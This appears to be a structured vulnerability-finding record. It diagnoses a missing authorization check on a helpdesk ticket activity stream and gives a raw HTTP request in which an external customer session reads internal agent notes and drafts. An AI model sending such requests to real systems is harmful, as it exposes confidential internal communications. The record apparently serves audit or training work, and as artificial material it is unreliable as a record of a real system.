diagnosis: The SSE stream broadcasts real-time agent typing activity and internal response drafts for ticketId. Because it omits checking if the requesting user owns the ticket or is an internal agent, end-customers can stream internal agent notes and unfinished drafts.
exploit_request:
GET /api/tickets/tkt_cust_8820/agent-activity-stream HTTP/1.1
Host: helpdesk.company.com
Cookie: session_user=external_customer
Accept: text/event-stream
